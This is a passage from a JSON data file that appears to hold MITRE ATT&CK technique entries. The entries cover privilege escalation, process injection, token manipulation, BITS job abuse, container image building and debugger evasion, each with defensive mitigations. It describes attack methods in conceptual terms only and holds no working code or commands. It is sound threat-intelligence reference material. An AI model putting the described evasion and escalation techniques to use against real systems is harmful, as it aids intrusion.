          "type": "text",
          "content": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked."
        }
      ],
      [
        {
          "type": "text",
          "content": "Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. "
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1068",
    "name": "Exploitation for Privilege Escalation",
    "tactics": [{ "id": "TA0004", "name": "Privilege Escalation" }],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions."
        }
      ],
      [
        {
          "type": "text",
          "content": "When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. "
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider blocking the execution of known vulnerable drivers that adversaries may exploit to execute code in kernel mode. Validate driver block rules in audit mode to ensure stability prior to production deployment."
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility and may not work for software components targeted for privilege escalation."
            }
          ]
        ]
      },
      {
        "id": "M1019",
        "name": "Threat Intelligence Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly by employing patch management for internal enterprise endpoints and servers."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574",
    "name": "Hijack Execution Flow",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0005", "name": "Defense Evasion" }
    ],
    "subs": [
      { "id": "T1574.001", "name": "DLL Search Order Hijacking" },
      { "id": "T1574.002", "name": "DLL Side-Loading" },
      { "id": "T1574.004", "name": "Dylib Hijacking" },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      { "id": "T1574.006", "name": "Dynamic Linker Hijacking" },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      { "id": "T1574.009", "name": "Path Interception by Unquoted Path" },
      { "id": "T1574.010", "name": "Services File Permissions Weakness" },
      { "id": "T1574.011", "name": "Services Registry Permissions Weakness" },
      { "id": "T1574.012", "name": "COR_PROFILER" },
      { "id": "T1574.013", "name": "KernelCallbackTable" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution."
        }
      ],
      [
        {
          "type": "text",
          "content": "There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "When possible, include hash values in manifest files to help prevent side-loading of malicious libraries."
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Use auditing tools capable of detecting hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for hijacking weaknesses."
            }
          ],
          [
            {
              "type": "text",
              "content": "Use the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software."
            }
          ],
          [
            {
              "type": "text",
              "content": "Find and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate."
            }
          ],
          [
            {
              "type": "text",
              "content": "Clean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations."
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions)."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Install software in write-protected locations. Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard library folders."
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "Restrict Library Loading",
        "description": [
          [
            {
              "type": "text",
              "content": "Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+."
            }
          ],
          [
            {
              "type": "text",
              "content": "Enable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. "
            },
            { "type": "code", "content": "%SYSTEMROOT%" },
            {
              "type": "text",
              "content": ")to be used before local directory DLLs (e.g. a user's home directory)"
            }
          ],
          [
            {
              "type": "text",
              "content": "The Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at "
            },
            {
              "type": "code",
              "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "Restrict Registry Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly to include patches that fix DLL side-loading vulnerabilities."
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "User Account Control",
        "description": [
          [
            {
              "type": "text",
              "content": "Turn off UAC's privilege elevation for standard users "
            },
            {
              "type": "code",
              "content": "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]"
            },
            {
              "type": "text",
              "content": " to automatically deny elevation requests, add: "
            },
            {
              "type": "code",
              "content": "\"ConsentPromptBehaviorUser\"=dword:00000000"
            },
            {
              "type": "text",
              "content": ". Consider enabling installer detection for all users by adding: "
            },
            {
              "type": "code",
              "content": "\"EnableInstallerDetection\"=dword:00000001"
            },
            {
              "type": "text",
              "content": ". This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: "
            },
            {
              "type": "code",
              "content": "\"EnableInstallerDetection\"=dword:00000000"
            },
            {
              "type": "text",
              "content": ". This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.  "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."
            }
          ],
          [
            {
              "type": "text",
              "content": "Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory "
            },
            { "type": "code", "content": "C:" },
            { "type": "text", "content": " and system directories, such as " },
            { "type": "code", "content": "C:\\Windows\\" },
            {
              "type": "text",
              "content": ", to reduce places where malicious files could be placed for execution."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1055",
    "name": "Process Injection",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1055.001", "name": "Dynamic-link Library Injection" },
      { "id": "T1055.002", "name": "Portable Executable Injection" },
      { "id": "T1055.003", "name": "Thread Execution Hijacking" },
      { "id": "T1055.004", "name": "Asynchronous Procedure Call" },
      { "id": "T1055.005", "name": "Thread Local Storage" },
      { "id": "T1055.008", "name": "Ptrace System Calls" },
      { "id": "T1055.009", "name": "Proc Memory" },
      { "id": "T1055.011", "name": "Extra Window Memory Injection" },
      { "id": "T1055.012", "name": "Process Hollowing" },
      { "id": "T1055.013", "name": "Process Doppelgänging" },
      { "id": "T1055.014", "name": "VDSO Hijacking" },
      { "id": "T1055.015", "name": "ListPlanting" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. "
        }
      ],
      [
        {
          "type": "text",
          "content": "There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. "
        }
      ],
      [
        {
          "type": "text",
          "content": "More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. For example, on Windows 10, Attack Surface Reduction (ASR) rules may prevent Office applications from code injection. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053",
    "name": "Scheduled Task/Job",
    "tactics": [
      { "id": "TA0002", "name": "Execution" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1053.002", "name": "At" },
      { "id": "T1053.003", "name": "Cron" },
      { "id": "T1053.005", "name": "Scheduled Task" },
      { "id": "T1053.006", "name": "Systemd Timers" },
      { "id": "T1053.007", "name": "Container Orchestration Job" }
    ],
    "version": "2.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. "
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at "
            },
            {
              "type": "code",
              "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl"
            },
            {
              "type": "text",
              "content": ". The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. "
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078",
    "name": "Valid Accounts",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [
      { "id": "T1078.001", "name": "Default Accounts" },
      { "id": "T1078.002", "name": "Domain Accounts" },
      { "id": "T1078.003", "name": "Local Accounts" },
      { "id": "T1078.004", "name": "Cloud Accounts" }
    ],
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence."
        }
      ],
      [
        {
          "type": "text",
          "content": "In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account."
        }
      ],
      [
        {
          "type": "text",
          "content": "The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "Account Use Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges."
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."
            }
          ]
        ]
      },
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. When possible, applications that use SSH keys should be updated periodically and properly secured."
            }
          ],
          [
            {
              "type": "text",
              "content": "Policies should minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1548",
    "name": "Abuse Elevation Control Mechanism",
    "tactics": [
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0005", "name": "Defense Evasion" }
    ],
    "subs": [
      { "id": "T1548.001", "name": "Setuid and Setgid" },
      { "id": "T1548.002", "name": "Bypass User Account Control" },
      { "id": "T1548.003", "name": "Sudo and Sudo Caching" },
      { "id": "T1548.004", "name": "Elevated Execution with Prompt" },
      { "id": "T1548.005", "name": "Temporary Elevated Cloud Access" }
    ],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Check for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "System settings can prevent applications from running that haven't been downloaded from legitimate repositories which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised. Additionally, the number of programs with setuid or setgid bits set should be minimized across a system. Ensuring that the sudo tty_tickets setting is enabled will prevent this leakage across tty sessions."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Remove users from the local administrator group on systems."
            }
          ],
          [
            {
              "type": "text",
              "content": "By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file. Setting the timestamp_timeout to 0 will require the user to input their password every time sudo is executed."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "The sudoers file should be strictly edited such that passwords are always required and that users can't spawn risky processes as users with higher privilege."
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "User Account Control",
        "description": [
          [
            {
              "type": "text",
              "content": "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as DLL Search Order Hijacking."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1134",
    "name": "Access Token Manipulation",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0004", "name": "Privilege Escalation" }
    ],
    "subs": [
      { "id": "T1134.001", "name": "Token Impersonation/Theft" },
      { "id": "T1134.002", "name": "Create Process with Token" },
      { "id": "T1134.003", "name": "Make and Impersonate Token" },
      { "id": "T1134.004", "name": "Parent PID Spoofing" },
      { "id": "T1134.005", "name": "SID-History Injection" }
    ],
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token."
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system."
        }
      ],
      [
        { "type": "text", "content": "Any standard user can use the " },
        { "type": "code", "content": "runas" },
        {
          "type": "text",
          "content": " command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object.  Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token."
            }
          ],
          [
            {
              "type": "text",
              "content": "Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command "
            },
            { "type": "code", "content": "runas" },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.  "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1197",
    "name": "BITS Jobs",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" }
    ],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations."
        }
      ],
      [
        {
          "type": "text",
          "content": "The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots)."
        }
      ],
      [
        {
          "type": "text",
          "content": "BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider reducing the default BITS job lifetime in Group Policy or by editing the "
            },
            { "type": "code", "content": "JobInactivityTimeout" },
            { "type": "text", "content": " and " },
            { "type": "code", "content": "MaxDownloadTime" },
            { "type": "text", "content": " Registry values in " },
            {
              "type": "code",
              "content": " HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS"
            },
            { "type": "text", "content": "." }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Consider limiting access to the BITS interface to specific users or groups."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1612",
    "name": "Build Image on Host",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote "
        },
        { "type": "code", "content": "build" },
        {
          "type": "text",
          "content": " request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it."
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary may take advantage of that "
        },
        { "type": "code", "content": "build" },
        {
          "type": "text",
          "content": " API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize Deploy Container using that custom image. If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit images deployed within the environment to ensure they do not contain any malicious components."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API on port 2375. Instead, communicate with the Docker API over TLS on port 2376."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1622",
    "name": "Debugger Evasion",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0007", "name": "Discovery" }
    ],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads."
        }
      ],
      [
        {
          "type": "text",
          "content": "Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads."
        }
      ],
      [
        {
          "type": "text",
          "content": "Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as "
        },
        { "type": "code", "content": "IsDebuggerPresent()" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": " NtQueryInformationProcess()" },
        { "type": "text", "content": ", or manually checking the " },
        { "type": "code", "content": "BeingDebugged" },
        {
          "type": "text",
          "content": " flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as "
        },
        { "type": "code", "content": "OutputDebugStringW()" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1140",
    "name": "Deobfuscate/Decode Files or Information",
    "tactics": [{ "id": "TA0005", "name": "Defense Evasion" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
